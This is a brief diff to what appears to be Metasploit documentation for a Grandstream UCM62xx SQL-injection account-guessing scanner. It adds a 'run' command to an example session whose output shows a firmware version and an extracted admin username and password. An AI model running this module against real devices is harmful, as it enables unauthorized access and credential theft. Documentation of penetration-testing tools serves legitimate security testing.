@@ -55,6 +55,7 @@ Module options (auxiliary/scanner/http/grandstream_ucm62xx_sql_account_guess):
    THREADS    1                yes       The number of concurrent threads (max one per host)
    VHOST                       no        HTTP server virtual host
 
+msf6 auxiliary(scanner/http/grandstream_ucm62xx_sql_account_guess) > run
 [*] Requesting version information from /cgi
 [*] The reported version is: 1.0.20.20
 [*] Found the following username and password: admin - cheesed00dle
